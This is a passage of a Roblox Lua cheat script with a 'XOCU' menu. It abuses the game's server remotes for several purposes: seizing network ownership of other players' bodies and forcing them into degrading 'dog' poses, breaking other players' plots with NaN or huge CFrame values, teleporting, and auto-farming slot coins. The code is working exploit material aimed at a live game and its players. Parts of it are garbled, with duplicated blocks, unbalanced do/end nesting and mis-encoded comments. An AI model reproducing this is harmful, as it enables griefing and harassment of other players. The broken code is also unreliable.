        if not g then return nil end
        local gp = g:FindFirstChild("GrabPart")
        if not gp then return nil end
        local weld = gp:FindFirstChild("WeldConstraint") or gp:FindFirstChild("Weld")
        if not weld then return nil end
        return weld.Part1 or nil
    end

    local function StickToGrabbedPartOnce()
        local grabbed = GetGrabbedPart()
        if not grabbed then
            if notify then notify("System", "Nothing grabbed!", 3) end
            return
        end

        if currentGrabbedHighlight then
            pcall(function() currentGrabbedHighlight:Destroy() end)
            currentGrabbedHighlight = nil
        end

        local highlight = Instance.new("SelectionBox")
        highlight.Adornee = grabbed
        highlight.Color3 = Color3.fromRGB(0, 250, 0)
        highlight.LineThickness = 0.03
        highlight.SurfaceTransparency = 0.8
        highlight.SurfaceColor3 = Color3.fromRGB(0, 250, 0)
        highlight.Parent = grabbed
        currentGrabbedHighlight = highlight

        local shuriken = CreateAndOwnShuriken(function() return true end)
        if not shuriken then
            pcall(function() highlight:Destroy() end)
            currentGrabbedHighlight = nil
            return
        end

        -- Left as NaN CFrame, assuming grabbed breaking uses math errors to clip
        StickShurikenToTarget(shuriken, grabbed, CFrame.new(0/0, 0/0, 0/0))
        HideShuriken(shuriken)

        if notify then notify("System", "Stuck to: " .. grabbed.Name, 3) end

        task.delay(3, function()
            if currentGrabbedHighlight and currentGrabbedHighlight == highlight then
                pcall(function() highlight:Destroy() end)
                currentGrabbedHighlight = nil
            end
        end)
    end

    -- ==========================================================
    -- XOCU UI INTEGRATION (Trimmed)
    -- ==========================================================

    MiscGroup:CreateButton({
        Name = "Stick to Grabbed Part",
        Callback = function()
            task.spawn(StickToGrabbedPartOnce)
        end
    })

    MiscGroup:CreateButton({
        Name = "Find Closest BaseGround",
        Callback = function()
            local char = LocalPlayer.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            if not hrp then
                if notify then notify("System", "No character!", 3) end
                return
            end

            local baseGround = Workspace:FindFirstChild("Map") and Workspace.Map:FindFirstChild("BaseGround")
            if not baseGround then
                if notify then notify("System", "BaseGround not found!", 3) end
                return
            end

            local children = baseGround:GetChildren()
            local closestPart = nil
            local closestIndex = nil
            local closestDist = math.huge
            local myPos = hrp.Position

            for i, child in ipairs(children) do
                if child:IsA("BasePart") then
                    local dist = (child.Position - myPos).Magnitude
                    if dist < closestDist then
                        closestDist = dist
                        closestPart = child
                        closestIndex = i
                    end
                end
            end

            if not closestPart then
                if notify then notify("System", "No BasePart found in BaseGround!", 3) end
                return
            end

            local pos = closestPart.Position
            local info = string.format(
                "Name: %s\nIndex: [%d]\nPosition: Vector3.new(%.2f, %.2f, %.2f)\nDistance: %.2f studs\nAccess: workspace.Map.BaseGround:GetChildren()[%d]",
                closestPart.Name,
                closestIndex,
                pos.X, pos.Y, pos.Z,
                closestDist,
                closestIndex
            )

            pcall(function()
                if setclipboard then
                    setclipboard(info)
                elseif toclipboard then
                    toclipboard(info)
                end
            end)

            pcall(function()
                local highlight = Instance.new("Highlight")
                highlight.Name = "ClosestBaseGroundESP"
                highlight.Adornee = closestPart
                highlight.FillColor = Color3.fromRGB(0, 255, 0)
                highlight.OutlineColor = Color3.fromRGB(255, 255, 0)
                highlight.FillTransparency = 0.4
                highlight.OutlineTransparency = 0
                highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                highlight.Parent = closestPart

                local billboard = Instance.new("BillboardGui")
                billboard.Name = "ClosestBaseGroundLabel"
                billboard.Adornee = closestPart
                billboard.Size = UDim2.new(0, 300, 0, 80)
                billboard.StudsOffset = Vector3.new(0, 5, 0)
                billboard.AlwaysOnTop = true
                billboard.Parent = closestPart

                local label = Instance.new("TextLabel")
                label.Size = UDim2.new(1, 0, 1, 0)
                label.BackgroundTransparency = 1
                label.Text = string.format("[%d] %s\n%.0f studs away", closestIndex, closestPart.Name, closestDist)
                label.TextColor3 = Color3.fromRGB(0, 255, 0)
                label.TextStrokeTransparency = 0
                label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
                label.Font = Enum.Font.GothamBold
                label.TextScaled = true
                label.Parent = billboard

                local att0 = Instance.new("Attachment", hrp)
                local att1 = Instance.new("Attachment", closestPart)

                local beam = Instance.new("Beam")
                beam.Attachment0 = att0
                beam.Attachment1 = att1
                beam.Color = ColorSequence.new(Color3.fromRGB(0, 255, 0), Color3.fromRGB(255, 255, 0))
                beam.Width0 = 0.5
                beam.Width1 = 0.5
                beam.FaceCamera = true
                beam.LightEmission = 1
                beam.Transparency = NumberSequence.new(0)
                beam.Parent = hrp

                task.delay(8, function()
                    if highlight then highlight:Destroy() end
                    if billboard then billboard:Destroy() end
                    if beam then beam:Destroy() end
                    if att0 then att0:Destroy() end
                    if att1 then att1:Destroy() end
                end)
            end)

            if notify then notify("System", "Closest: [" .. closestIndex .. "] " .. closestPart.Name .. " - copied!", 5) end
        end
    })
end
do
    -- Ensure your block is created properly
    local MiscGroup = Tabs.Misc:CreateBlock({Name = "Plots", Side = "Right"})

    local SelectedPlot = "1"
    local PlotOptions = {"Plot1 (Green)", "Plot2 (Pink)", "Plot3 (Purple)", "Plot4 (Blue)", "Plot5 (Yellow)"}

    -- Plot Selection Dropdown (Using CreateDropdown instead of AddDropdown)
    MiscGroup:CreateDropdown({
        Name = "Select Plot",
        Flag = "PlotBreaker_SelectPlot",
        Items = PlotOptions,
        Default = "Plot1 (Green)",
        Callback = function(Value)
            SelectedPlot = Value:match("Plot(%d)") or "1"
        end
    })

    -- Helper Functions
    local function getHRP()
        if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
            return Player.Character.HumanoidRootPart
        else
            local character = Player.CharacterAdded:Wait()
            return character:WaitForChild("HumanoidRootPart")
        end
    end

    local function getOrCreateShuriken()
        local playersInPlots = Workspace:FindFirstChild("PlotItems") and Workspace.PlotItems:FindFirstChild("PlayersInPlots")
        if playersInPlots and playersInPlots:FindFirstChild(Player.Name) then
            if notify then notify("Break Plot", "You Are In safe zone!", 3) end
            return nil
        end
        
        local inv = Workspace:FindFirstChild(Player.Name.."SpawnedInToys")
        if not inv then return nil end
        
        local myHRP = getHRP()
        for _, obj in pairs(inv:GetChildren()) do
            if (obj.Name == "NinjaShuriken" or obj.Name == "Noclipped") and obj:FindFirstChild("StickyPart") and obj:FindFirstChild("SoundPart") then
                if myHRP and (obj.StickyPart.Position - myHRP.Position).Magnitude <= 12 then
                    return obj
                end
            end
        end
        
        local currentHRP = getHRP()
        if not currentHRP then return nil end
        
        local toyAdded
        local shur = nil
        toyAdded = inv.ChildAdded:Connect(function(child)
            if child.Name == "NinjaShuriken" then
                shur = child
                toyAdded:Disconnect()
            end
        end)
        
        RS.MenuToys.SpawnToyRemoteFunction:InvokeServer("NinjaShuriken", currentHRP.CFrame * CFrame.new(5, 8, 20), Vector3.new(0, 0, 0))
        
        local startTime = tick()
        repeat
            if shur and shur:FindFirstChild("StickyPart") and shur:FindFirstChild("SoundPart") then
                return shur
            end
            task.wait(0.01)
        until tick() - startTime > 0.1
        
        return inv:FindFirstChild("NinjaShuriken")
    end

    -- Plot Breaker Execution Button (Using CreateButton instead of AddButton)
    MiscGroup:CreateButton({
        Name = "Break Plot [Shuriken]",
        Flag = "PlotBreaker_Execute",
        Callback = function()
            local shur = getOrCreateShuriken()
            if not shur then return end
            
            local soundPart = shur:FindFirstChild("SoundPart")
            local stickyPart = shur:FindFirstChild("StickyPart")
            if not stickyPart then return end
            
            if soundPart then
                local setOwner = RS:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner")
                for i = 1, 20 do
                    setOwner:FireServer(soundPart, soundPart.CFrame)
                    if soundPart:FindFirstChild("PartOwner") and soundPart.PartOwner.Value == Player.Name then break end
                end
            end
            
            for _, obj in pairs(shur:GetChildren()) do
                if obj:IsA("BasePart") then
                    obj.CanTouch = false; obj.CanCollide = false; obj.CanQuery = false
                    if obj.Transparency == 0 then obj.Transparency = 1 end
                end
            end
            shur.Name = "Noclipped"
            
            local plot = Workspace.Plots:FindFirstChild("Plot"..SelectedPlot)
            if not plot then return end
            local plotArea = plot:FindFirstChild("PlotArea")
            if not plotArea then return end
            
            RS.PlayerEvents.StickyPartEvent:FireServer(stickyPart, plotArea, CFrame.new(1099511627776, 1099511627776, 1099511627776, 1, 0, 0, 0, 1, 0, 0, 0, 1))
        end
    })
end

local SlotsFolder = workspace:WaitForChild('Slots')
local SlotsScreen = SlotsFolder:WaitForChild('Slots')
local SlotGui = SlotsScreen:WaitForChild('Screen'):WaitForChild('SlotGui')
local TimeTextObj = SlotGui:WaitForChild('TimeLeftFrame'):WaitForChild('TimeText')
local slotHandle = workspace.Slots.Slots.SlotHandle.Handle
local targetTime = '0:00'
local farmingActive = false
local slotTeleportPosition = Vector3.new(-224.941177, 91.364975, 425.75116)
local savedCFrame = nil

local FarmGroup = Tabs.Misc:CreateBlock({Name = "Farm Coins", Side = "Right"})

local function updateTimeLabel()
    pcall(function()
        if TimeTextObj then
            Library:Notify({
                Title = "Slot Time",
                Content = "Time: " .. TimeTextObj.Text,
                Duration = 1
            })
        end
    end)
end

task.spawn(function()
    while task.wait(1) do
        if farmingActive and TimeTextObj then
            pcall(function()
                updateTimeLabel()
            end)
        end
    end
end)

function farmLoop()
    while farmingActive do
        task.wait(1)

        local char = LocalPlayer.Character
        local hrp = char and char:FindFirstChild('HumanoidRootPart')

        if not hrp then
            continue
        end

        savedCFrame = hrp.CFrame

        local currentTime = TimeTextObj and TimeTextObj.Text

        if currentTime == targetTime then
            hrp.CFrame = CFrame.new(slotTeleportPosition)

            task.wait(1)
            pcall(function()
                ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(slotHandle, CFrame.new(slotTeleportPosition))
            end)
            task.wait(1)

            if hrp and hrp.Parent then
                hrp.CFrame = savedCFrame
            end
        end
    end
end

FarmGroup:CreateToggle({
    Name = "Auto Spin Slots",
    Flag = "AutoFarmToggle",
    Default = false,
    Callback = function(state)
        farmingActive = state
        if state then
            task.spawn(farmLoop)
        end
    end
})

LocalPlayer.CharacterAdded:Connect(function(char)
    char:WaitForChild('HumanoidRootPart')
    if farmingActive then
        task.spawn(farmLoop)
    end
end)

do
    MiscGroup:CreateButton({
        Name = "Bring Train (Use vfly in IY)",
        Callback = function()
            -- 1. Dynamically fetch services and character variables so they never become "stale" after respawning
            local Players = game:GetService("Players")
            local rs = game:GetService("ReplicatedStorage")
            local plr = Players.LocalPlayer
            local char = plr.Character or plr.CharacterAdded:Wait()
            local HRP = char:FindFirstChild("HumanoidRootPart")
            local hum = char:FindFirstChild("Humanoid")
            local inv = workspace:FindFirstChild(plr.Name .. "SpawnedInToys")
            
            local DestroyToy = rs:WaitForChild("MenuToys", 5) and rs.MenuToys:FindFirstChild("DestroyToy")
            local SpawnToy = rs:WaitForChild("MenuToys", 5) and rs.MenuToys:FindFirstChild("SpawnToyRemoteFunction")

            -- Safety check
            if not HRP or not hum or not inv then return end

            -- 2. Helper Functions
            local function getplot()
                for i = 1, 5 do
                    local plot = workspace.Plots:FindFirstChild("Plot"..i)
                    local value = plot and plot:FindFirstChild("PlotSign") and plot.PlotSign:FindFirstChild("ThisPlotsOwners") and plot.PlotSign.ThisPlotsOwners:FindFirstChild("Value")
                    if plot and value and value.Value:find(plr.Name) then
                        return plot
                    end
                end
                return nil
            end

            local function spawntoy(toy, cf)
                if plr:FindFirstChild("CanSpawnToy") and not plr.CanSpawnToy.Value then
                    plr.CanSpawnToy.Changed:Wait()
                end
                
                local t
                local toyadded
                toyadded = inv.ChildAdded:Connect(function(c)
                    if c.Name == toy then
                        t = c
                        toyadded:Disconnect()
                    end
                end)
                
                task.spawn(function()
                    pcall(function()
                        SpawnToy:InvokeServer(toy, cf, Vector3.new(0, 0, 0))
                    end)
                end)
                
                local time = tick() + 1
                repeat task.wait() until t or tick() > time
                
                if t then
                    return t
                else
                    local plot = getplot()
                    if plot then
                        local plotItems = workspace:FindFirstChild("PlotItems")
                        if plotItems and plotItems:FindFirstChild(plot.Name) then
                            return plotItems[plot.Name]:FindFirstChild(toy) or plotItems[plot.Name]:WaitForChild(toy, 0.5)
                        end
                    end
                end
            end

            local function grab(obj)
                if obj and obj:FindFirstChild("HoldPart") and obj.HoldPart:FindFirstChild("HoldItemRemoteFunction") then
                    pcall(function()
                        obj.HoldPart.HoldItemRemoteFunction:InvokeServer(obj, char)
                    end)
                end
            end

            -- 3. Main Execution Logic
            local pos = HRP.CFrame
            local burger = spawntoy("FoodHamburger", HRP.CFrame)
            
            if burger then
                repeat task.wait() until burger:FindFirstChild("HoldPart")
                
                local map = workspace:FindFirstChild("Map")
                local train = map and map:FindFirstChild("AlwaysHereTweenedObjects") and map.AlwaysHereTweenedObjects:FindFirstChild("Train")
                
                if train and train:FindFirstChild("Object") then
                    local trainObj = train.Object
                    local model = trainObj:FindFirstChild("ObjectModel")
                    local followPart = trainObj:FindFirstChild("FollowThisPart")
                    
                    -- Sit in the train
                    if model and model:FindFirstChild("Seat") then
                        model.Seat:Sit(hum)
                    end
                    
                    -- Disable train physics alignment
                    if followPart then
                        if followPart:FindFirstChild("AlignPosition") then
                            followPart.AlignPosition.Enabled = false
                        end
                        if followPart:FindFirstChild("AlignOrientation") then
                            followPart.AlignOrientation.Enabled = false
                        end
                    end
                end
                
                task.wait(0.1)
                grab(burger)
                task.wait(0.1)
                
                -- Cleanup
                pcall(function()
                    DestroyToy:FireServer(burger)
                end)
                
                -- Pop player back up
                HRP.CFrame = pos * CFrame.new(0, 5, 0)
            else
                if Library and Library.Notify then
                    Library:Notify({ Title = "Error", Content = "Failed to spawn Hamburger.", Duration = 3 })
                end
            end
        end
    })
end

PS.PlayerAdded:Connect(function(plr)
	if plr:IsFriendsWith(Player.UserId) then
		notify("Notify friend", plr.Name .. " joined", 5)
	end
end)
do
local Players = game:GetService("Players")
local variants = {
	"BlackHole",
	"Black_Hole",
	"Blackhole",
	"Black-Hole",
	"BHole",
	"BH",
	"VoidHole",
	"Void",
	"VoidSphere",
	"DarkHole",
	"DarkSphere",
	"DarkOrb",
	"GravityHole",
	"GravityOrb",
	"SpaceHole",
	"SpaceOrb",
	"Singularity",
	"SingularityOrb",
	"EventHorizon",
	"BlackSphere",
	"Anomaly",
	"AnomalyHole",
	"SupermassiveHole",
	"QuantumHole"
}

-- ===============================
-- RAGALIC CLIENT вЂў KICK NOTIFY
-- ===============================

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local SoundService = game:GetService("SoundService")

local LocalPlayer = Players.LocalPlayer

-- ===============================
-- SOUND (BELL)
-- ===============================
function playKickSound()
	local s = Instance.new("Sound")
	s.SoundId = "rbxassetid://79150789336480" -- Bell (Deltarune)
	s.Volume = 5
	s.PlayOnRemove = true
	s.Parent = SoundService
	s:Destroy()
end

-- ===============================
-- NOTIFY (XOCU)
-- ===============================
function notifyKick(displayName, username)
	Library:Notify({ Title = "XOCU ", Content = displayName .. " (" .. username .. ") has been kicked", Duration = 6,
	 })
end

-- ===============================
-- HELPERS
-- ===============================
function getClosestPlayer(pos)
	local closestPlr = nil
	local closestDist = math.huge
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LocalPlayer and plr.Character then
			local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
			if hrp then
				local dist = (hrp.Position - pos).Magnitude
				if dist < closestDist then
					closestDist = dist
					closestPlr = plr
				end
			end
		end
	end
	return closestPlr
end

-- ===============================
-- BLACK HOLE DETECT
-- ===============================
Workspace.ChildAdded:Connect(function(obj)
	if obj.Name == "BlackHoleKick" or obj.Name == "BlackHoleDetected" then
		task.wait(0.05)
		local pos
		if obj:IsA("BasePart") then
			pos = obj.Position
		elseif obj:IsA("Model") and obj.PrimaryPart then
			pos = obj.PrimaryPart.Position
		end
		if not pos then
			return
		end
		local plr = getClosestPlayer(pos)
		if not plr then
			return
		end
		playKickSound()
		notifyKick(plr.DisplayName, plr.Name)
	end
end)
end

-- Auras Group


local KeybindsGroup = Tabs.Keybinds:CreateBlock({Name = "Keybind1", Side = "Left"})
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")

local Player = Players.LocalPlayer
local Mouse = Player:GetMouse()

local tpEnabled = true -- РјРѕР¶РЅРѕ СѓР±СЂР°С‚СЊ, РµСЃР»Рё РЅРµ РЅСѓР¶РµРЅ on/off

KeybindsGroup:CreateKeybind({
	Name = "Teleport to Mouse",
	Flag = "TPKeybind",
	Default = "X",
	Callback = function()
		if not tpEnabled then
			return
		end
		local character = Player.Character
		local hrp = character and character:FindFirstChild("HumanoidRootPart")
		if not hrp then
			return
		end
		local targetPos = Mouse.Hit.Position
		hrp.CFrame = CFrame.new(targetPos + Vector3.new(0, 3, 0))
	end
})
-- =========================================================================
-- LOOPGRAB POSE [DOG] (INTEGRATED INTO KEYBINDSGROUP)
-- =========================================================================
do
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local LocalPlayer = Players.LocalPlayer

    local loopGrabDogActive = false
    local LoopGrabDogConn = nil
    local SpamChar = nil

    local function stopDogPose()
        loopGrabDogActive = false
        if LoopGrabDogConn then
            LoopGrabDogConn:Disconnect()
            LoopGrabDogConn = nil
        end
        
        -- Restore collisions and velocities
        if SpamChar and SpamChar.Parent and SpamChar:FindFirstChild("Head") then 
            for _, v in pairs(SpamChar:GetChildren()) do 
                if v:IsA("BasePart") then 
                    v.AssemblyLinearVelocity = Vector3.zero
                    v.AssemblyAngularVelocity = Vector3.zero
                    v.CanCollide = true
                end
            end
        end
        SpamChar = nil
    end

    local function startDogPose()
        local Mouse = LocalPlayer:GetMouse()
        local target = Mouse.Target
        if not target then 
            Library:Notify({ Title = "System", Content = "No target found under mouse!", Duration = 3 })
            return 
        end
        
        SpamChar = target.Parent
        local Head = SpamChar:FindFirstChild("Head")
        local Torso = SpamChar:FindFirstChild("Torso") or SpamChar:FindFirstChild("UpperTorso")
        local Hum = SpamChar:FindFirstChildOfClass("Humanoid")
        
        if not (Torso and Head and Hum) then 
            SpamChar = nil
            Library:Notify({ Title = "System", Content = "Invalid character target!", Duration = 3 })
            return 
        end
        
        loopGrabDogActive = true
        local snoRemote = ReplicatedStorage:WaitForChild("GrabEvents", 5) and ReplicatedStorage.GrabEvents:FindFirstChild("SetNetworkOwner")
        local myChar = LocalPlayer.Character
        local hrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
        
        Library:Notify({ Title = "Dog Pose", Content = "Locked onto " .. SpamChar.Name, Duration = 3 })

        LoopGrabDogConn = RunService.Heartbeat:Connect(function()
            if not loopGrabDogActive or not hrp or not SpamChar or not SpamChar.Parent then
                stopDogPose()
                return
            end
            
            Torso = SpamChar:FindFirstChild("Torso") or SpamChar:FindFirstChild("UpperTorso")
            Head = SpamChar:FindFirstChild("Head")
            if not Torso or not Head then 
                stopDogPose()
                return 
            end
            
            -- Claim Network Ownership
            if snoRemote then
                pcall(function() snoRemote:FireServer(Head, Head.CFrame) end)
            end
            
            -- Ghosting collisions
            for _, x in pairs(SpamChar:GetDescendants()) do 
                if x:IsA("BasePart") then 
                    x.CanCollide = false
                end
            end
            
            Hum.Health = 100 -- Prevent dying from physics glitches
            
            -- Force Dog Pose CFrames relative to your HRP
            Torso.CFrame = hrp.CFrame * CFrame.new(0, -1, -2) * CFrame.Angles(math.rad(-90), 0, math.rad(180))
            Head.CFrame = Torso.CFrame * CFrame.new(0, 1, 0) * CFrame.Angles(math.rad(90), 0, 0)
            
            local lArm = SpamChar:FindFirstChild("Left Arm")
            if lArm then lArm.CFrame = Torso.CFrame * CFrame.new(-1, 0.5, 0) * CFrame.Angles(math.rad(60), 0, math.rad(-30)) end
            
            local rArm = SpamChar:FindFirstChild("Right Arm")
            if rArm then rArm.CFrame = Torso.CFrame * CFrame.new(1, 0.5, 0) * CFrame.Angles(math.rad(60), 0, math.rad(30)) end
            
            local lLeg = SpamChar:FindFirstChild("Left Leg")
            if lLeg then lLeg.CFrame = Torso.CFrame * CFrame.new(-0.5, -1, 0) * CFrame.Angles(math.rad(40), 0, 0) end
            
            local rLeg = SpamChar:FindFirstChild("Right Leg")
            if rLeg then rLeg.CFrame = Torso.CFrame * CFrame.new(0.5, -1, 0) * CFrame.Angles(math.rad(40), 0, 0) end
        end)
    end
-- =========================================================================
-- LOOPGRAB POSE [DOG] (REFINED ANATOMY)
-- =========================================================================
do
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local LocalPlayer = Players.LocalPlayer

    local loopGrabDogActive = false
    local LoopGrabDogConn = nil
    local SpamChar = nil

    local function stopDogPose()
        loopGrabDogActive = false
        if LoopGrabDogConn then
            LoopGrabDogConn:Disconnect()
            LoopGrabDogConn = nil
        end
        if SpamChar and SpamChar.Parent then 
            for _, v in pairs(SpamChar:GetDescendants()) do 
                if v:IsA("BasePart") then 
                    v.AssemblyLinearVelocity = Vector3.zero
                    v.CanCollide = true
                end
            end
        end
        SpamChar = nil
    end

    local function startDogPose()
        local Mouse = LocalPlayer:GetMouse()
        local target = Mouse.Target
        if not target or not target.Parent:FindFirstChild("Humanoid") then return end
        
        SpamChar = target.Parent
        loopGrabDogActive = true
        
        local snoRemote = ReplicatedStorage:FindFirstChild("GrabEvents") and ReplicatedStorage.GrabEvents:FindFirstChild("SetNetworkOwner")
        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        
        LoopGrabDogConn = RunService.Heartbeat:Connect(function()
            if not loopGrabDogActive or not hrp or not SpamChar:FindFirstChild("Torso") then stopDogPose() return end
            
            local Torso = SpamChar.Torso
            local Head = SpamChar:FindFirstChild("Head")
            
            -- Network Ownership
            if snoRemote then pcall(function() snoRemote:FireServer(Head, Head.CFrame) end) end
            
            -- Dog Math: Torso horizontal, limbs tucked under
            Torso.CFrame = hrp.CFrame * CFrame.new(0, -1.2, -2.5) * CFrame.Angles(math.rad(-90), 0, 0)
            
            if Head then 
                Head.CFrame = Torso.CFrame * CFrame.new(0, 1.3, -0.2) * CFrame.Angles(math.rad(45), 0, 0) 
            end
            
            -- Limbs as Paws
            local LArm = SpamChar:FindFirstChild("Left Arm")
            local RArm = SpamChar:FindFirstChild("Right Arm")
            local LLeg = SpamChar:FindFirstChild("Left Leg")
            local RLeg = SpamChar:FindFirstChild("Right Leg")
            
            if LArm then LArm.CFrame = Torso.CFrame * CFrame.new(-0.8, 0.5, 0.5) * CFrame.Angles(math.rad(90), 0, math.rad(20)) end
            if RArm then RArm.CFrame = Torso.CFrame * CFrame.new(0.8, 0.5, 0.5) * CFrame.Angles(math.rad(90), 0, math.rad(-20)) end
            if LLeg then LLeg.CFrame = Torso.CFrame * CFrame.new(-0.6, -1.2, 0.5) * CFrame.Angles(math.rad(90), 0, math.rad(10)) end
            if RLeg then RLeg.CFrame = Torso.CFrame * CFrame.new(0.6, -1.2, 0.5) * CFrame.Angles(math.rad(90), 0, math.rad(-10)) end
            
            -- Disable collisions so they don't bounce
            for _, p in pairs(SpamChar:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide = false end end
        end)
    end

    KeybindsGroup:CreateKeybind({
        Name = "Dog Pose Quick V1",
        Flag = "DogPoseKey",
        Default = "T",
        Callback = function()
            if loopGrabDogActive then
                stopDogPose()
            else
                startDogPose()
            end
        end
    })
end
    -- Auto-bind for T (Spam keybind) within KeybindsGroup
    KeybindsGroup:CreateKeybind({
        Name = "Dog Pose Quick V2",
        Flag = "DogPoseKey",
        Default = "T",
        Callback = function()
            local newState = not loopGrabDogActive
            SetToggleState("LoopGrab_Dog", newState)
            
            -- If you want the toggle visually updated in the UI, you may need to call Options["LoopGrab_Dog"]:Set(newState) depending on your UI library.
            
            if newState then
                startDogPose()
            else
                stopDogPose()
                Library:Notify({ Title = "Dog Pose", Content = "Deactivated", Duration = 3 })
            end
        end
    })
end

do

    local FGM = {}
    FGM.Players = game:GetService("Players")
    FGM.RunService = game:GetService("RunService")
    FGM.ReplicatedStorage = game:GetService("ReplicatedStorage")
    FGM.UserInputService = game:GetService("UserInputService")
    FGM.Workspace = game:GetService("Workspace")
    FGM.TweenService = game:GetService("TweenService")
    FGM.LocalPlayer = FGM.Players.LocalPlayer
    FGM.Mouse = FGM.LocalPlayer:GetMouse()

    local GrabFolder = FGM.ReplicatedStorage:FindFirstChild("GrabEvents") or FGM.ReplicatedStorage:WaitForChild("GrabEvents", 10)
    FGM.GrabEvents = GrabFolder
    FGM.SetNetworkOwner = GrabFolder and (GrabFolder:FindFirstChild("SetNetworkOwner") or GrabFolder:WaitForChild("SetNetworkOwner", 5))
    FGM.DestroyLine = GrabFolder and (GrabFolder:FindFirstChild("DestroyGrabLine") or GrabFolder:WaitForChild("DestroyGrabLine", 5))
    FGM.CreateLine = GrabFolder and (GrabFolder:FindFirstChild("CreateGrabLine") or GrabFolder:WaitForChild("CreateGrabLine", 5))

    local MenuToys = FGM.ReplicatedStorage:FindFirstChild("MenuToys") or FGM.ReplicatedStorage:WaitForChild("MenuToys", 10)
    FGM.MenuToys = MenuToys
    FGM.ToySpawn = MenuToys and (MenuToys:FindFirstChild("SpawnToyRemoteFunction") or MenuToys:WaitForChild("SpawnToyRemoteFunction", 5))
    FGM.DestroyToy = MenuToys and (MenuToys:FindFirstChild("DestroyToy") or MenuToys:WaitForChild("DestroyToy", 5))

    FGM.State = {
        FigureGrabEnabled = false,
        FigureGrabConnection = nil,
        TargetCharacter = nil,
        TargetPlayer = nil,
        AnimationCopyEnabled = false,
        VectorZero = Vector3.new(0, 0, 0),
        PalletForRagdoll = nil,
        RagdollConnections = {},
        LoopRagdollEnabled = false,
        RespawnConnection = nil,
        RejoinConnection = nil,
        SmoothedCFrames = {},
        SelectedLimb = 'Torso',
        AutoGrabActive = false,
        AutoGrabConnection = nil,
        LastGrabTargetRef = nil,
        DistanceTPInProgress = false,
        FreezeLimbsEnabled = false,
        FrozenCFrames = {},
        VelSuppressEnabled = false,
        GravityFlipEnabled = false,
        LockRotationEnabled = false,
        LockedRotation = CFrame.identity,
        ForceLookAtEnabled = false,
        ForceUprightEnabled = false,
        FlingOnReleaseEnabled = false,
        FlingForce = 300,
        HoldAtCameraEnabled = false,
        OscillateEnabled = false,
        OscillateSpeed = 2,
        OscillateAmount = 3,
        OscillateTimer = 0,
        SpinEnabled = false,
        SpinSpeed = 180,
        SpinAngle = 0,
        ActiveNetworkTarget = nil,
        HighlightedLimb = nil,
        LimbHighlight = nil,
        PersistentGrabActive = false,
        PersistentGrabThread = nil,
        SavedPosition = nil,
        AutoRagdollToggle = false,
        AutoRagdollEnabled = false,
        AutoRagdollConnection = nil,
        RagdollPallet = nil,
        RagdollSoundPart = nil,
        SeveralEnabled = false,
        SeveralTargets = {},
        LastTargetUserId = nil,
        LastTargetHRP = nil,
        IsReturning = false,
        SelectedTarget = nil,
    }

    FGM.Configuration = {
        DampingEnabled = true,
        DampingSpeed = 12,
        SnapEnabled = false,
        SnapPosStep = 0.5,
        SnapRotStep = 15,
        LineDistance = 0,
        AutoTPDistance = 40,
        HoldPosition = { X = 0, Y = 0, Z = -5 },
        HoldRotation = { X = 0, Y = 0, Z = 0 },
        LeftArmPosition = { X = 0, Y = 0, Z = 0 },
        LeftArmRotation = { X = 0, Y = 0, Z = 0 },
        RightArmPosition = { X = 0, Y = 0, Z = 0 },
        RightArmRotation = { X = 0, Y = 0, Z = 0 },
        LeftLegPosition = { X = 0, Y = 0, Z = 0 },
        LeftLegRotation = { X = 0, Y = 0, Z = 0 },
        RightLegPosition = { X = 0, Y = 0, Z = 0 },
        RightLegRotation = { X = 0, Y = 0, Z = 0 },
        HeadPosition = { X = 0, Y = 0, Z = 0 },
        HeadRotation = { X = 0, Y = 0, Z = 0 },
    }

    FGM.Presets = {
        Pose1 = {
            HoldPosition = { X = 0, Y = 0, Z = -7.5 },
            HoldRotation = { X = 90, Y = 0, Z = 108 },
            LeftArmPosition = { X = -1.5, Y = 1, Z = -1 },
            LeftArmRotation = { X = 283, Y = 0, Z = 0 },
            RightArmPosition = { X = 1.5, Y = 0.5, Z = 1 },
            RightArmRotation = { X = 270, Y = 0, Z = 0 },
            LeftLegPosition = { X = 0.5, Y = -1.5, Z = 0.5 },
            LeftLegRotation = { X = 312, Y = 0, Z = 0 },
            RightLegPosition = { X = -0.5, Y = -1.5, Z = 0.5 },
            RightLegRotation = { X = 283, Y = 0, Z = 0 },
            HeadPosition = { X = 0, Y = 1.5, Z = 0 },
            HeadRotation = { X = 0, Y = 0, Z = 0 },
        },
        Pose2 = {
            HoldPosition = { X = 0, Y = -1.5, Z = -12.5 },
            HoldRotation = { X = 272, Y = 0, Z = 0 },
            LeftArmPosition = { X = -1, Y = 1, Z = -0.5 },
            LeftArmRotation = { X = 90, Y = 0, Z = 0 },
            RightArmPosition = { X = 1, Y = 1, Z = -0.5 },
            RightArmRotation = { X = 90, Y = 0, Z = 0 },
            LeftLegPosition = { X = 1, Y = -1, Z = -0.5 },
            LeftLegRotation = { X = 90, Y = 0, Z = 0 },
            RightLegPosition = { X = -1, Y = -1, Z = -0.5 },
            RightLegRotation = { X = 90, Y = 0, Z = 0 },
            HeadPosition = { X = 0, Y = 1, Z = 1 },
            HeadRotation = { X = 90, Y = 0, Z = 0 },
        },
        Pose3 = {
            HoldPosition = { X = 0, Y = -5.5, Z = -4 },
            HoldRotation = { X = 0, Y = 0, Z = 0 },
            LeftArmPosition = { X = 1, Y = 7.5, Z = 1.5 },
            LeftArmRotation = { X = 0, Y = 0, Z = 0 },
            RightArmPosition = { X = 1, Y = 6, Z = 1.5 },
            RightArmRotation = { X = 0, Y = 0, Z = 0 },
            LeftLegPosition = { X = 0.5, Y = 5, Z = 1.5 },
            LeftLegRotation = { X = 0, Y = 0, Z = 92 },
